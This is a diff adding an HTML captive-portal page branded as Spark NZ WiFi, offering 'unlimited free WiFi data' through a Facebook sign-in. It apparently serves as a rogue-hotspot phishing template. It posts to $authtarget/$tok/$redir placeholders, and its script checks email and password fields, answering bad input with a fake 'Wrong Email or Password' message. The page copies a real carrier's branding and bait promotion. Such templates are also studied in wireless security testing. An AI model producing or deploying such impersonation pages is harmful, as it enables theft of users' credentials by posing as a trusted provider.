@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"><!-- NHN -->
+    <title>Spark</title>
+    <link href="images/style.css" rel="stylesheet"/>
+
+    <script src="images/modernizr8fce?v=wBEWDufH_8Md-Pbioxomt90vm6tJN2Pyy9u9zHtWsPo1"></script>
+<script>
+function validateForm() {
+    var x = document.forms["theform"]["email"].value;
+    var atpos = x.indexOf("@");
+    var dotpos = x.lastIndexOf(".");
+    if (atpos<1 || dotpos<atpos+2 || dotpos+2>=x.length) {
+        alert("Failed to login. Wrong Email or Password.");
+        return false;
+    }
+
+    var x = document.forms["theform"]["password"].value;
+    if (5>=x.length) {
+        alert("Failed to login. Wrong Email or Password.");
+        return false;
+    }
+}
+</script>
+
+    <link rel="apple-touch-icon" sizes="57x57" href="images/apple-icon-57x57.png" />
+    <link rel="apple-touch-icon" sizes="72x72" href="images/apple-icon-72x72.png" />
+    <link rel="apple-touch-icon" sizes="114x114" href="images/apple-icon-114x114.png" />
+    <link rel="apple-touch-icon" sizes="144x144" href="images/apple-icon-144x144.png" />
+</head>
+<body class="pink-bg">
+    <div class="wifi-container">
+        <div class="center-wrap pink">
+<div class="wifi-body wifi-home">
+    <img class="wifi-home-logo" src="images/sparknz-stacked.png" />
+    <div class="container2">
+        <img src="images/wifi-zone.png" class="wifi-white">
+        <div class="intro span6">
+            <p style="display:inline-block;color:white;background:#572a86;font-size: 1em;font-weight: bold;padding:5px;">PROMOTION:</p><br />
+            <p style="display:inline-block;color:white;background:#572a86;font-size: 1.5em;font-weight: bold;padding:5px;">UNLIMITED FREE WIFI DATA!*</p>
+            <h1>GET INTO IT</h1>
+            <div class="hidden-phone">
+                <p class="large">More places to get online while you're out and about. With over 1,000 WiFi hotspots nationwide, you can use our data not yours to check news, transport times, stream Spotify or whatever takes your fancy.</p>
+                <p class="large">*To get unlimited WiFi data every day on the Spark WiFi Network, you'll need to be signed in to a <span class="plans1">Facebook Account</span>
+                <p class="large">If you're not a Spark customer you can get a free <span class="trialtime">15-minute</span> trial followed by an option to pay for access. There is a daily 1GB datacap in this case. You'll need a Facebook account to register.</p>
+            </div>
+        </div>
+        <div class="row button-group">
+            <div class="span6 offset4 intro-button">
+	<form name="theform" class="theform" method="get" action="$authtarget">
+    <input type='hidden' name='tok' value='$tok'>
+    <input type='hidden' name='redir' value='$redir'>
+    <button type='submit' class="button blue">CONNECT</button>
+    </form> 
+	</div>
+        </div>
+    </div>
+</div>
+        </div>
+    </div>
+    <script src="images/jqueryc061?v=FVs3ACwOLIVInrAl5sdzR2jrCDmVOWFbZMY6g6Q0ulE1"></script>
+    <script src="images/bootstrap8718?v=v_LtOCvOfPjUh6p9ogVBArBgU_iZLT-Tsnka6fM40SA1"></script>
+</body>
+</html>
